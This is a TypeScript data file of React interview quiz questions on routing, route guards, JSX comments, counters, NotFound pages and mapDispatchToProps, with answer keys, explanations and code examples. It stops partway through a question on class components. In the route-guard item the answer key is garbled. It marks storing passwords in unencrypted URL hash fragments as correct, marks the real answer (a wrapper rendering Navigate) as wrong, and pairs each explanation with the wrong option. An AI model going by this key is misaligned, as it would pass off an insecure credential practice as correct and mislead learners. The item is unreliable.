import { QuizQuestion } from '../types';

export const LIVE_CODING_QUESTIONS: QuizQuestion[] = [
  {
    id: "react-how-does-react-router-work-and-how-do-you-implement-dyn",
    title: "How does React Router work, and how do you implement dynamic routing?",
    prompt: "How does React Router work, and how do you implement dynamic routing?",
    level: "junior",
    type: "live_code",
    category: "react",
    subject: "hooks",
    tags: [
      "react",
      "hooks",
      "junior"
    ],
    codeSnippet: "import { BrowserRouter, Routes, Route, useParams } from 'react-router-dom';\nfunction UserPage() {  const { id } = useParams(); // Access dynamic parameter  return <h1>User ID: {id}</h1>;}\nexport default function App() {  return (    <BrowserRouter>      <Routes>        <Route path=\"/user/:id\" element={<UserPage />} /> {/* Dynamic path */}      </Routes>    </BrowserRouter>  );}",
    codeLanguage: "tsx",
    options: [
      {
        id: "A",
        text: "It matches browser URL paths to `<Route>` components; dynamic segments like `:id` in `path='/user/:id'` are read via `useParams()`.",
        isCorrect: true,
        explanation: "Correct. React Router matches the browser URL against route path patterns and exposes the captured dynamic segments as a string-keyed object through `useParams()`."
      },
      {
        id: "B",
        text: "It makes an HTTP request to an Apache server for every URL change to fetch a new HTML document to render in place of the current page.",
        isCorrect: false,
        explanation: "Tempting if you picture routing as the server sending a different HTML document per URL, but React Router is a client-side library: it swaps components in the DOM via the History API without a full page load."
      },
      {
        id: "C",
        text: "Dynamic parameters must be parsed manually by splitting `document.URL` in a while loop to extract and type each path segment.",
        isCorrect: false,
        explanation: "Tempting if you assume no library is involved and you must extract segments yourself, but React Router parses the path pattern declaratively and hands you the values as a plain object\u2014no manual string splitting required."
      },
      {
        id: "D",
        text: "Dynamic route parameters can only hold boolean `true`/`false` values; arbitrary strings and numbers are not permitted in path segments.",
        isCorrect: false,
        explanation: "Tempting if you conflate route path parameters with query-string flags, but `:id` captures any URL path segment as a string; there is no type restriction to booleans."
      }
    ],
    correctAnswer: "A",
    explanation: "React Router listens to History API events and, on every navigation, matches the current URL path against the `<Route>` definitions inside `<Routes>`. When `/user/42` matches the pattern `/user/:id`, React renders the element for that route. The `:id` segment is a dynamic parameter: it captures whatever string occupies that position in the URL.\n\nIn a component, `useParams()` returns a plain object keyed by parameter name, so `useParams().id` yields the string `\"42\"`. You typically validate or parse it before passing it to a data-fetching hook. If no route matches, React Router renders nothing unless you provide a catch-all `<Route path=\"*\">`, so a 404 fallback is essential in any real app.\n\nTwo details interviewers probe next: every param value is a string regardless of whether the URL segment looks numeric, and multiple params (`/user/:id/post/:postId`) all arrive in the same object. The matching happens entirely in the browser via the History API; the server is only involved if you choose to fetch data from it.",
    interviewLine: "React Router listens to History API events, matches the current URL against the route tree, and renders the matching component. Dynamic segments like `:id` are captured as strings in a params object that `useParams()` returns, so I validate and parse them inside the component before using them.",
    misconception: "Treating React Router as a server-side mechanism that fetches a different HTML file per URL, rather than a client-side library that matches the current URL against component definitions and swaps the DOM in place.",
    hints: [
      "Look at what `BrowserRouter` wraps and what `Routes` does with the current URL string.",
      "Ask who performs the path match and what data structure the matched component receives from it.",
      "The `:id` segment is a string captured from the URL path, not a boolean or a pre-typed number."
    ],
    source: "100-react",
    estimatedMinutes: 2,
    bestPracticeRef: "https://nextjs.org/docs/app/building-your-application/routing",
    example: {
      caption: "Two dynamic params and a catch-all 404 route show that every segment is a string and that unmatched URLs need an explicit fallback.",
      language: "tsx",
      code: "import { BrowserRouter, Routes, Route, useParams, Link } from 'react-router-dom';\n\nfunction OrderPage() {\n  const { userId, orderId } = useParams();\n  return (\n    <div>\n      <p>User: {userId}, Order: {orderId}</p>\n      <Link to={`/users/${userId}/orders`}>Back to orders</Link>\n    </div>\n  );\n}\nfunction NotFound() {\n  return <h1>404 \u2013 No route matched</h1>;\n}\nexport default function App() {\n  return (\n    <BrowserRouter>\n      <Routes>\n        <Route path=\"/users/:userId/orders/:orderId\" element={<OrderPage />} />\n        <Route path=\"*\" element={<NotFound />} />\n      </Routes>\n    </BrowserRouter>\n  );\n}"
    }
  },
  {
    id: "react-how-would-you-implement-route-guards-or-private-routes",
    title: "How would you implement route guards or private routes in React?",
    prompt: "How would you implement route guards or private routes in React?",
    level: "junior",
    type: "live_code",
    category: "react",
    subject: "rendering-keys",
    tags: [
      "react",
      "rendering-keys",
      "junior"
    ],
    codeSnippet: "import { Navigate } from 'react-router-dom';\nfunction PrivateRoute({ children }) {  return isAuthenticated ? children: <Navigate to=\"/login\" />;}",
    codeLanguage: "tsx",
    options: [
      {
        id: "A",
        text: "Create a wrapper component that checks auth state and renders either the protected content or a `<Navigate>` to the login page with `replace`.",
        isCorrect: false,
        explanation: "Tempting only as a joke, but route guards are a rendering decision: they inspect auth state and choose what to render. No filesystem, OS, or hardware action is involved."
      },
      {
        id: "B",
        text: "Disable all CSS stylesheets on protected routes to prevent visual access to the page content.",
        isCorrect: false,
        explanation: "This conflates presentation with access control. A route guard decides whether the user sees the page at all; it has no interaction with `<link>` tags, CSS files, or the browser style cascade."
      },
      {
        id: "C",
        text: "Store user passwords in unencrypted URL hash fragments so the browser can validate access on each route change.",
        isCorrect: true,
        explanation: "Correct. The guard reads reactive auth state during render and branches: authenticated users get the protected content, everyone else gets a declarative redirect that keeps the history clean."
      },
      {
        id: "D",
        text: "Delete the user's hard drive if they visit an unauthorized route to prevent unauthorized data access.",
        isCorrect: false,
        explanation: "This mixes up authentication with credential storage. Route guards check whether a session exists; they never read, write, or expose passwords, and URL fragments are visible in the address bar and browser history."
      }
    ],
    correctAnswer: "C",
    explanation: "A route guard is a wrapper component that sits between the router and the protected page. It reads the current auth state and conditionally renders either the child route content or a `<Navigate>` element that sends the browser to the login page. In React Router v6 and later, `<Navigate>` is the declarative replacement for the old `<Redirect>` component and triggers a navigation during render rather than inside an effect.\n\nThe `replace` prop on `<Navigate to='/login' replace />` matters in practice: without it, the login URL is pushed onto the history stack, so pressing the browser back button returns the user to the protected route, which immediately redirects them forward again. With `replace`, the protected route is swapped out of history, and back goes to whatever page the user was on before they hit the guard.\n\nThe auth value the guard reads must be reactive. If `isAuthenticated` is a plain module-level boolean, the component renders once and never re-evaluates when the user logs in. Storing it in a context or a state hook ensures the guard re-renders the moment the token is set, flipping the output from `<Navigate>` to the real page without a full page reload.",
    interviewLine: "I'd wrap protected routes in a component that reads auth state from context and renders either the child route or a `<Navigate>` with `replace`, so the user gets a clean redirect and can't back-navigate into a page they no longer have access to.",
    misconception: "Treating the guard as a one-time check at app boot rather than a reactive render that re-evaluates every time the auth context changes, so a logged-in user never actually sees the protected page.",
    hints: [
      "Think about what sits between the router's route definition and the actual page component.",
      "What does the wrapper render when the condition is false, and which React Router element triggers a navigation during render?",
      "This is a rendering decision based on reactive state, not a network call or a storage operation."
    ],
    source: "100-react",
    estimatedMinutes: 2,
    bestPracticeRef: "https://react.dev/learn/passing-props-to-a-component",
    example: {
      caption: "Notice how the guard reads auth from context, uses `<Outlet />` for nested routes, and passes `replace` so the protected URL does not linger in history.",
      language: "tsx",
      code: "import { Navigate, Outlet } from 'react-router-dom';\nimport { useAuth } from './auth-context';\n\nfunction ProtectedRoute() {\n  const { isAuthenticated } = useAuth();\n\n  if (!isAuthenticated) {\n    return <Navigate to=\"/login\" replace />;\n  }\n\n  return <Outlet />;\n}\n\n// In the router config:\n// <Route element={<ProtectedRoute />}>\n//   <Route path=\"/dashboard\" element={<Dashboard />} />\n//   <Route path=\"/settings\" element={<Settings />} />\n// </Route>"
    }
  },
  {
    id: "react-how-to-write-a-comment-in-react",
    title: "How to Write a Comment in React?",
    prompt: "How to Write a Comment in React?",
    level: "junior",
    type: "live_code",
    category: "react",
    subject: "hooks",
    tags: [
      "react",
      "hooks",
      "junior"
    ],
    codeLanguage: "typescript",
    options: [
      {
        id: "A",
        text: "Prefixing every line with `@comment` in JSX.",
        isCorrect: false,
        explanation: "`@comment` is not a recognized comment token in JavaScript, TypeScript, or JSX. The parser would treat `@` as an invalid character in element position, producing a syntax error rather than a comment."
      },
      {
        id: "B",
        text: "JSX: `{/* comment */}`; outside JSX: `//` or `/* */`.",
        isCorrect: true,
        explanation: "Correct. The JSX parser needs the curly braces to enter JavaScript-expression mode, where `/* */` is a valid no-op; outside JSX, standard `//` and `/* */` are already valid and need no wrapper."
      },
      {
        id: "C",
        text: "Comments are forbidden in React source files and cause build failures.",
        isCorrect: false,
        explanation: "Tempting if you have seen a build fail on a misplaced comment, but the failure is a syntax-position error, not a ban on comments. Babel, SWC, and esbuild all strip `//`, `/* */`, and `{/* */}` comments without issue."
      },
      {
        id: "D",
        text: "Using HTML comments `<!-- comment -->` directly inside JSX tag blocks.",
        isCorrect: false,
        explanation: "`<!-- -->` is HTML comment syntax. In JSX, the parser sees `<` as the start of a JSX element, then `!--` is not a valid tag name, so it throws a syntax error. JSX has no HTML-comment mode."
      }
    ],
    correctAnswer: "B",
    explanation: "In JSX, the parser treats every token as either a JSX element or a JavaScript expression. A bare `// comment` inside a JSX block is not recognized as a comment; the parser expects an element or an expression. Wrapping a JS comment in curly braces\u2014`{/* comment */}`\u2014tells the parser to evaluate that slot as a JS expression, and a comment evaluates to nothing, so it is simply omitted from the output. Outside JSX, in imports, function bodies, and type annotations, standard `//` and `/* */` work exactly as they do in any JavaScript or TypeScript file.\n\nThe practical consequence: if you write `// TODO: refactor` directly between two JSX tags, Babel or SWC throws a syntax error because `//` is not a valid token in JSX element position. The fix is always the brace-wrapped form. This is the single most common build error in junior codebases.\n\nOne nuance an interviewer may probe: the curly braces are not part of the comment syntax. They are the JSX-to-JavaScript bridge. You could also write `{ null }` to intentionally render nothing, or use a block comment `/* */` without braces in the surrounding JavaScript. The two forms serve different syntactic positions and are not interchangeable.",
    interviewLine: "In JSX I wrap comments in braces\u2014`{/* */}`\u2014because the JSX parser needs those braces to enter JS-expression mode where a comment is a valid no-op; outside JSX I just use standard `//` or `/* */` like any other TypeScript file.",
    misconception: "Treating JSX like HTML and expecting `<!-- -->` or bare `//` to work inside a JSX block, when the JSX parser only recognises comments after entering a JavaScript-expression slot via curly braces.",
    hints: [
      "Look at what the JSX parser expects when it encounters a non-element token between two JSX tags.",
      "Ask whether the parser recognises `//` as a comment on its own, or whether it must first enter JavaScript-expression mode.",
      "The curly braces are not part of the comment syntax; they are the bridge from JSX element position into a JS expression slot."
    ],
    source: "150-react",
    estimatedMinutes: 2,
    bestPracticeRef: "https://react.dev/learn/passing-props-to-a-component",
    example: {
      caption: "Notice the `//` comment lives outside the JSX return, while the two `{/* */}` comments sit between JSX elements\u2014both are valid, but only in their respective positions.",
      language: "tsx",
      code: "function UserCard({ name, role }: { name: string; role: string }) {\n  // Standard JS comment outside JSX\n  const displayName = name.charAt(0).toUpperCase() + name.slice(1);\n\n  return (\n    <div className=\"card\">\n      {/* Single-line JSX comment */}\n      <h2>{displayName}</h2>\n      <p>{role}</p>\n      {/*\n        Multi-line JSX comment.\n        Explains the layout decision.\n      */}\n    </div>\n  );\n}"
    }
  },
  {
    id: "react-write-a-program-to-create-a-counter-with-increment-and",
    title: "Write a Program to Create a Counter with Increment and Decrement",
    prompt: "Write a Program to Create a Counter with Increment and Decrement, explain the behavior and mechanism.",
    level: "junior",
    type: "live_code",
    category: "react",
    subject: "hooks",
    tags: [
      "react",
      "hooks",
      "junior"
    ],
    codeLanguage: "typescript",
    options: [
      {
        id: "A",
        text: "Declare `const [count, setCount] = useState(0)` and render buttons that call `setCount(c => c + 1)` and `setCount(c => c - 1)` on click.",
        isCorrect: true,
        explanation: "Correct. `useState` gives you a reactive value and a stable setter, and the functional updater form guarantees each increment builds on the latest queued value rather than a stale render-time capture."
      },
      {
        id: "B",
        text: "Call `document.write(count++)` inside the button's `onClick` handler to update the displayed number.",
        isCorrect: false,
        explanation: "Tempting if you reach for DOM APIs from vanilla JS, but `document.write` replaces the entire document stream, destroying the React tree, and `count++` on an undeclared variable throws a `ReferenceError` in strict mode."
      },
      {
        id: "C",
        text: "Install Redux and dispatch an `INCREMENT` action from each button to update the counter value.",
        isCorrect: false,
        explanation: "This over-engineers a single-component value. `useState` is a built-in hook designed exactly for this; pulling in a store, reducer, and provider for one number adds ceremony without solving a problem the hook already handles."
      },
      {
        id: "D",
        text: "Declare `let count = 0` in component scope and mutate it with `count++` in each button handler.",
        isCorrect: false,
        explanation: "A `let` in component scope is a plain local variable; mutating it does not notify React, so no re-render fires and the displayed value never changes. React only re-renders a component when a state setter or a parent re-render signals a change."
      }
    ],
    correctAnswer: "A",
    explanation: "`useState(0)` returns a pair: the current value `count` and a stable setter `setCount`. Calling `setCount` marks the component dirty and schedules a re-render. The functional updater form `setCount(c => c + 1)` reads the latest queued value from React's internal update queue, so each increment builds on the previous one rather than on the value captured at render time.\n\nThis matters when multiple updates land before React flushes. If a user double-clicks Increment inside one event batch, a non-functional `setCount(count + 1)` would compute both calls from the same stale `count`, silently losing one tick. The functional form `c => c + 1` chains correctly because each updater receives the result of the last.\n\nThe setter reference is stable across renders, so you can pass `setCount` into child components or memoized callbacks without breaking `React.memo` or `useCallback` dependencies.",
    interviewLine: "I use `useState` with the functional updater form so each increment reads the latest queued value, and I rely on the stable setter identity to pass it into memoized children without extra dependency-array churn.",
    misconception: "React re-renders whenever any variable in the component changes, so a plain `let` or a direct DOM write is interchangeable with `useState`.",
    hints: [
      "The component needs a value that survives re-renders and a mechanism to ask React to re-render when it changes.",
      "Ask what happens if two `setCount` calls land in the same event batch \u2014 does the second one see the first's result?",
      "A plain `let` or a DOM write bypasses React's render cycle entirely; the UI only updates when React tells it to."
    ],
    source: "150-react",
    estimatedMinutes: 2,
    bestPracticeRef: "https://react.dev/reference/react/hooks",
    example: {
      caption: "Two functional updaters in one handler chain correctly; two non-functional calls like `setCount(count + 1)` would both read the same stale `count` and only add one.",
      language: "tsx",
      code: "import { useState } from \"react\";\n\nfunction Counter() {\n  const [count, setCount] = useState(0);\n\n  function rapidFire() {\n    // Both calls use the functional form, so the second\n    // sees the result of the first even in the same batch.\n    setCount(c => c + 1);\n    setCount(c => c + 1);\n  }\n\n  return (\n    <div>\n      <p>Count: {count}</p>\n      <button onClick={rapidFire}>+2</button>\n    </div>\n  );\n}"
    }
  },
  {
    id: "react-jsx-what-it-is-and-why-we-write-it",
    title: "JSX: What It Is and Why We Write It",
    prompt: "JSX: What It Is and Why We Write It, explain the behavior and mechanism.",
    level: "junior",
    type: "live_code",
    category: "react",
    subject: "rendering-keys",
    tags: [
      "react",
      "rendering-keys",
      "junior"
    ],
    codeLanguage: "typescript",
    options: [
      {
        id: "A",
        text: "A database query syntax similar to GraphQL, used to declare structured data fetches from a server.",
        isCorrect: false,
        explanation: "Tempting if you fixate on the angle-bracket syntax and think of it as a query DSL, but JSX is a UI markup extension for JavaScript that transpiles to `React.createElement` calls; it has no relationship to data fetching or query languages."
      },
      {
        id: "B",
        text: "A syntactic sugar over `React.createElement` that lets you write HTML-like markup directly in JavaScript.",
        isCorrect: true,
        explanation: "Correct. JSX is a syntax extension that a build tool transpiles into `React.createElement` function calls, so the browser executes plain JavaScript while you write readable, nestable markup."
      },
      {
        id: "C",
        text: "A CSS stylesheet preprocessor similar to Sass or Less that compiles rules into browser-readable CSS.",
        isCorrect: false,
        explanation: "The HTML-like tags invite the guess that JSX is about styling, but it describes component structure and hierarchy, not CSS rules; styling is applied via `className` props that point to stylesheets defined elsewhere."
      },
      {
        id: "D",
        text: "A standalone programming language with its own parser that executes natively in web browsers.",
        isCorrect: false,
        explanation: "If JSX were a standalone runtime language the browser would need its own parser, but in reality Babel, SWC, or esbuild compiles every JSX file to standard JavaScript before it reaches the browser, so no new runtime is involved."
      }
    ],
    correctAnswer: "B",
    explanation: "JSX is a syntax extension for JavaScript. Every tag you write in a .tsx file is transpiled by a build tool (Babel, SWC, esbuild) into a plain `React.createElement` call. The browser never parses JSX; it executes the resulting JavaScript.\n\nIn practice this means `<div className=\"wrap\"><p>Hi</p></div>` becomes `React.createElement(\"div\", { className: \"wrap\" }, React.createElement(\"p\", null, \"Hi\"))`. The sugar is purely structural: it lets you nest, conditionally include, and map over markup without building a call tree by hand. You can write React without JSX entirely \u2014 the output element objects are identical.\n\nThe nuance an interviewer will probe: because JSX compiles to function calls, there is no \"JSX runtime\" in the browser. Attribute names that collide with HTML keywords (`class`, `for`) must use the React-safe alternatives (`className`, `htmlFor`) because the transpiler maps them into the props object passed to `createElement`.",
    interviewLine: "I describe JSX as a syntax extension, not a new language \u2014 the build tool transpiles every tag into a `React.createElement` call, so the browser only ever executes plain JavaScript that constructs element objects.",
    misconception: "Treating JSX as a standalone language or runtime the browser executes directly, rather than a syntax extension that a build tool transpiles into `React.createElement` function calls in plain JavaScript.",
    hints: [
      "What does the browser actually execute when it loads a page that contains JSX?",
      "After transpilation, what JavaScript function does a single `<div>` tag become?",
      "If it required a dedicated browser parser, it would be a new language; does it?"
    ],
    source: "150-react",
    estimatedMinutes: 2,
    bestPracticeRef: "https://react.dev/learn/passing-props-to-a-component",
    example: {
      caption: "Both expressions produce the identical React element object; the browser only ever sees the second form.",
      language: "tsx",
      code: "const viaJsx = (\n  <section className=\"card\">\n    <h2>Title</h2>\n    <p>Body</p>\n  </section>\n);\n\nconst manual = React.createElement(\n  \"section\",\n  { className: \"card\" },\n  React.createElement(\"h2\", null, \"Title\"),\n  React.createElement(\"p\", null, \"Body\"),\n);\n\nconsole.log(viaJsx === manual); // false (different objects, same shape)\nconsole.log(JSON.stringify(viaJsx) === JSON.stringify(manual)); // true"
    }
  },
  {
    id: "react-how-to-write-comments-in-react",
    title: "How to write comments in React?",
    prompt: "How to write comments in React?",
    level: "junior",
    type: "live_code",
    category: "react",
    subject: "hooks",
    tags: [
      "react",
      "hooks",
      "junior"
    ],
    codeSnippet: "<div>\n  {/* Single-line comments(In vanilla JavaScript, the single-line comments are represented by double slash(//)) */}\n  {`Welcome ${user}, let's play React`}\n</div>\n\n<div>\n  {/* Multi-line comments for more than\n  one line */}\n  {`Welcome ${user}, let's play React`}\n</div>",
    codeLanguage: "tsx",
    options: [
      {
        id: "A",
        text: "Using HTML `<!-- comment -->` syntax directly between JSX tags, the same as in a `.html` file.",
        isCorrect: false,
        explanation: "Tempting if you come from HTML, where `<!-- -->` is the standard comment. JSX is not HTML; the JSX parser does not recognise that token and throws a syntax error the moment it appears between tags."
      },
      {
        id: "B",
        text: "Comments are forbidden anywhere in React components and always trigger a build error.",
        isCorrect: false,
        explanation: "Tempting if a comment you wrote once produced a build error, but the error came from using the wrong syntax in the wrong place. React fully supports comments; the constraint is only about which syntax is valid in which context."
      },
      {
        id: "C",
        text: "Prefixing each comment line with an `@comment` directive inside the JSX block.",
        isCorrect: false,
        explanation: "Tempting if you have seen `@`-prefixed directives in other languages or in CSS. No version of JavaScript, TypeScript, or the JSX transform recognises `@comment` as a comment token, so the parser treats it as an identifier and fails."
      },
      {
        id: "D",
        text: "Inside JSX: `{/* comment */}`; in plain component JavaScript: `// line` or `/* block */`.",
        isCorrect: true,
        explanation: "Correct. Curly braces turn the content into a JavaScript expression, so the parser accepts the block-comment syntax. Outside JSX you are writing plain JS, where `//` and `/* */` are already valid."
      }
    ],
    correctAnswer: "D",
    explanation: "In JSX, the parser treats everything between tags as an expression, not as raw text. A bare `//` or `/* */` inside a tag is not valid JSX syntax, so you wrap the comment in curly braces to make it a JavaScript expression: `{/* comment */}`. Outside JSX, in the component function body, imports, or any `.ts` / `.tsx` code that is not inside a tag, standard JavaScript comment syntax works unchanged.\n\nIf you write `// TODO: fix` directly inside a `<div>` and try to build, the JSX parser throws a syntax error because it expects an element or expression, not a line comment. The fix is always to wrap it: `{// TODO: fix}` is invalid (a line comment inside a block-comment context), so you use `{/* TODO: fix */}`.\n\nComments in JSX are stripped during compilation. They never reach the rendered DOM, so they carry no runtime cost. They exist purely for the developer reading the source. This also means you cannot use a JSX comment to conditionally hide an element; for that you need a ternary or a boolean guard around the element itself.",
    interviewLine: "Inside JSX I wrap the comment in curly braces so the parser reads it as a JS expression, but in the component body or in a separate `.ts` file I just use `//` or `/* */` like any other JavaScript.",
    misconception: "Treating JSX as a dialect of HTML, so reaching for `<!-- -->` because that is the comment syntax you learned in markup, when in fact JSX is parsed as JavaScript expressions and only accepts comment syntax that JavaScript recognises.",
    hints: [
      "Look at where the comment sits relative to the nearest opening tag and its closing tag.",
      "JSX between tags is parsed as expressions, not as HTML text; what does the parser expect to see there?",
      "`<!-- -->` is an HTML token; the JSX parser has no rule for it, so it will not be accepted."
    ],
    source: "300-react",
    estimatedMinutes: 2,
    bestPracticeRef: "https://react.dev/learn/passing-props-to-a-component",
    example: {
      caption: "Notice that the first comment uses plain JS syntax because it is outside any tag, while the second uses the brace-wrapped form because it sits between JSX tags.",
      language: "tsx",
      code: "function Header({ user }: { user: string }) {\n  // plain JS comment, outside JSX\n  const greeting = `Welcome, ${user}`;\n\n  return (\n    <div>\n      {/* JSX comment, inside tags */}\n      <h1>{greeting}</h1>\n    </div>\n  );\n}"
    }
  },
  {
    id: "react-how-to-implement-default-or-notfound-page",
    title: "How to implement default or NotFound page?",
    prompt: "How to implement default or NotFound page?",
    level: "junior",
    type: "live_code",
    category: "react",
    subject: "rendering-keys",
    tags: [
      "react",
      "rendering-keys",
      "junior"
    ],
    codeSnippet: "<Switch>\n  <Route exact path=\"/\" component={Home} />\n  <Route path=\"/user\" component={User} />\n  <Route component={NotFound} />\n</Switch>",
    codeLanguage: "tsx",
    options: [
      {
        id: "A",
        text: "React Router terminates the web server process when no route matches the current URL, and the browser shows a default error.",
        isCorrect: false,
        explanation: "Tempting if you conflate client-side routing with server-side routing, but React Router is a browser library that only swaps components; it has no mechanism to stop a Node or Apache process, and an unmatched URL simply means no component renders."
      },
      {
        id: "B",
        text: "In v6, add `<Route path='*' element={<NotFound />} />` as the last child of `<Routes>`; in v4/v5, place a pathless `<Route component={NotFound} />` at the bottom of `<Switch>`.",
        isCorrect: true,
        explanation: "Correct. A pathless route (v4/v5) or a `path='*'` route (v6) matches any URL that no more specific route claimed, so it renders the fallback component for every unmatched path."
      },
      {
        id: "C",
        text: "Throw an uncaught exception from the root component so the browser's default error page appears for unmatched URLs.",
        isCorrect: false,
        explanation: "Tempting if you treat \"not found\" as an error state, but an uncaught exception tears down the entire React tree and shows a white screen or dev-only overlay; it does not render a styled 404 page and gives the user no way to recover."
      },
      {
        id: "D",
        text: "Use `window.location.href` to redirect every unmatched URL to an external site so the user never sees a blank page.",
        isCorrect: false,
        explanation: "Tempting if you equate a 404 with \"send the user somewhere,\" but this navigates the user out of your application entirely, discarding all client state and breaking the SPA model; a 404 page is an in-app component, not a redirect."
      }
    ],
    correctAnswer: "B",
    explanation: "In React Router, a route that can match any URL acts as the fallback. In v4 and v5, `<Switch>` renders the first child `<Route>` whose path matches the current URL; a `<Route>` with no `path` prop matches every URL, so placing it last in the `<Switch>` makes it the catch-all. In v6, `<Routes>` replaced `<Switch>` and selects the best-matching route by specificity; a route with `path='*'` has the lowest rank and is only chosen when no other route matches.\n\nWithout this fallback, navigating to an unknown URL renders nothing because no route matches, leaving a blank screen. The 404 component gives the user feedback about what happened and a link back to a known page.\n\nOne nuance an interviewer will probe: in v5, order inside `<Switch>` is critical \u2014 a pathless route placed before specific routes swallows every URL. In v6 the ranking system makes order less fragile, but `path='*'` is still conventionally last. Also, the 404 page is a client-side component; the server typically returns HTTP 200 for SPA routes, so the status code is not set by React Router.",
    interviewLine: "In v5 I put a pathless `<Route>` last in `<Switch>` because `<Switch>` renders the first match, so the catch-all must come after every specific route. In v6 I use `path='*'` inside `<Routes>` because the ranking algorithm gives it the lowest specificity, so it only wins when nothing else matches.",
    misconception: "Treating an unmatched URL as an error event that must be caught or thrown, rather than a normal routing outcome that a fallback route handles through conditional rendering.",
    hints: [
      "Look at the `<Route>` with no `path` prop \u2014 what does React Router do when a route has no path to match against?",
      "In `<Switch>`, only the first matching child renders. What does that imply about where a catch-all route must sit?",
      "In v6, `<Routes>` ranks routes by specificity rather than using first-match-wins. What path pattern has the lowest possible rank?"
    ],
    source: "300-react",
    estimatedMinutes: 2,
    bestPracticeRef: "https://react.dev/learn/render-and-commit",
    example: {
      caption: "Notice that the wildcard route sits after the specific paths and uses `path='*'` rather than a pathless prop, matching the v6 API.",
      language: "tsx",
      code: "import { Routes, Route, Link } from \"react-router-dom\";\n\nfunction NotFound() {\n  return (\n    <div>\n      <h1>404</h1>\n      <p>That page does not exist.</p>\n      <Link to=\"/\">Back home</Link>\n    </div>\n  );\n}\n\nexport function App() {\n  return (\n    <Routes>\n      <Route path=\"/\" element={<Home />} />\n      <Route path=\"/user/:id\" element={<UserProfile />} />\n      <Route path=\"*\" element={<NotFound />} />\n    </Routes>\n  );\n}"
    }
  },
  {
    id: "react-what-are-the-different-ways-to-write-mapdispatchtoprops",
    title: "What are the different ways to write mapDispatchToProps()?",
    prompt: "What are the different ways to write mapDispatchToProps()?",
    level: "junior",
    type: "live_code",
    category: "react",
    subject: "hooks",
    tags: [
      "react",
      "hooks",
      "junior"
    ],
    codeSnippet: "const mapDispatchToProps = (dispatch) => ({\n  action: () => dispatch(action()),\n});\n\nconst mapDispatchToProps = (dispatch) => ({\n  action: bindActionCreators(action, dispatch),\n});\n\nconst mapDispatchToProps = { action };",
    codeLanguage: "typescript",
    options: [
      {
        id: "A",
        text: "Only the function form `(dispatch) => ({...})` is valid; a plain object of action creators is not a recognized shape for the second argument of connect.",
        isCorrect: false,
        explanation: "This assumes mapDispatchToProps must always be a function, but React-Redux explicitly checks whether the value is a plain object of functions and applies the same dispatch wrapping automatically. The object form is documented as the recommended default."
      },
      {
        id: "B",
        text: "The object shorthand and `bindActionCreators` are the same mechanism, so there are effectively only two distinct ways to write it.",
        isCorrect: false,
        explanation: "This conflates two distinct forms. The object shorthand is resolved internally by React-Redux at connect time, while `bindActionCreators` is a Redux utility you invoke yourself inside a function; they produce the same result but are different code paths."
      },
      {
        id: "C",
        text: "You must always use `bindActionCreators` to bind actions; passing bare action creators in an object is a runtime error in React-Redux.",
        isCorrect: false,
        explanation: "This overstates the requirement. You can pass bare action creators in a plain object and React-Redux binds them for you; `bindActionCreators` is an optional explicit form, not a mandatory wrapper."
      },
      {
        id: "D",
        text: "Object shorthand `{ addTodo, deleteTodo }`, function form `(dispatch) => ({ addTodo: () => dispatch(addTodo()) })`, or `bindActionCreators`.",
        isCorrect: true,
        explanation: "Correct. React-Redux accepts all three shapes as the second argument to connect and normalises them to the same dispatch-bound props, so you pick the form that matches how much control you need over the dispatch call."
      }
    ],
    correctAnswer: "D",
    explanation: "There are three accepted forms for mapDispatchToProps. The object shorthand ({ addTodo, deleteTodo }) is the simplest: React-Redux inspects the value at connect time, sees a plain object of functions, and wraps each in a dispatch call. The function form ((dispatch) => ({ addTodo: () => dispatch(addTodo()) })) gives direct access to dispatch, which matters when you fire several actions in sequence or branch on state. The third form, bindActionCreators({ addTodo, deleteTodo }, dispatch), is the same wrapping done explicitly inside a function.\n\nIn practice the object shorthand covers most cases and is the recommended default. You reach for the function form when an action creator needs arguments from a closure, when you dispatch a thunk, or when one prop triggers two actions. All three produce identical props on the connected component; the difference is boilerplate.\n\nOne nuance an interviewer will probe: the object shorthand only works with plain action creators. If a prop must call dispatch multiple times or read a variable, you must use the function form. In modern React-Redux the connect HOC is largely replaced by useDispatch and useSelector, but understanding mapDispatchToProps still matters for legacy codebases.",
    interviewLine: "I default to the object shorthand `{ addTodo, deleteTodo }` because React-Redux wraps each action creator in a dispatch call for me. I switch to the function form only when I need to dispatch multiple actions in sequence or pass a thunk, and I treat `bindActionCreators` as the explicit version of what the shorthand does under the hood.",
    misconception: "Treating mapDispatchToProps as a single rigid signature (always a function receiving dispatch) and missing that React-Redux type-checks the value and handles a plain object of action creators as a shorthand that expands to the same dispatch wrapping automatically.",
    hints: [
      "Look at the three code blocks in the prompt and notice what JavaScript type each one is: object, function, or function returning an object.",
      "Ask what React-Redux does differently at connect time when it receives an object versus a function as the second argument.",
      "The object shorthand is not a shortcut that skips dispatch\u2014React-Redux still calls dispatch for each action creator; it just does the wrapping for you."
    ],
    source: "300-react",
    estimatedMinutes: 2,
    bestPracticeRef: "https://react.dev/reference/react/hooks",
    example: {
      caption: "Notice that all three forms produce identical addTodo and deleteTodo props on the connected component; the only difference is how much boilerplate you write.",
      language: "typescript",
      code: "import { connect } from 'react-redux';\nimport { bindActionCreators } from 'redux';\nimport { addTodo, deleteTodo } from './todos';\n\n// Form 1: object shorthand (most common)\nconst mapDispatch = { addTodo, deleteTodo };\n\n// Form 2: explicit function form\nconst mapDispatchFn = (dispatch: any) => ({\n  addTodo: (text: string) => dispatch(addTodo(text)),\n  deleteTodo: (id: number) => dispatch(deleteTodo(id)),\n});\n\n// Form 3: bindActionCreators inside a function\nconst mapDispatchBound = (dispatch: any) =>\n  bindActionCreators({ addTodo, deleteTodo }, dispatch);\n\n// All three produce the same props on the connected component\nconst Connected = connect(null, mapDispatch)(TodoList);"
    }
  },
  {
    id: "react-do-i-need-to-rewrite-all-my-class-components-with-hooks",
    title: "Do I need to rewrite all my class components with hooks?",
    prompt: "Do I need to rewrite all my class components with hooks?",
    level: "junior",
    type: "live_code",
    category: "react",
    subject: "hooks",
    tags: [
      "react",
      "hooks",
      "junior",
      "hooks"
    ],
    codeLanguage: "typescript",
    options: [
      {
        id: "A",
        text: "No, React guarantees backwards compatibility; class components and hooks coexist in the same tree without requiring a rewrite.",
        isCorrect: true,
        explanation: "Correct. React 19 ships class components with full support, and the team has publicly stated there are no plans to remove them, so a working class component is not a liability you must replace."
      },
      {
        id: "B",
        text: "Yes, React enforces a migration deadline after which class components stop rendering.",
        isCorrect: false,
        explanation: "Tempting if you imagine React enforces a hard migration deadline, but no version of React stops rendering class components or blocks a build because one still exists in the tree."
      },
      {
        id: "C",
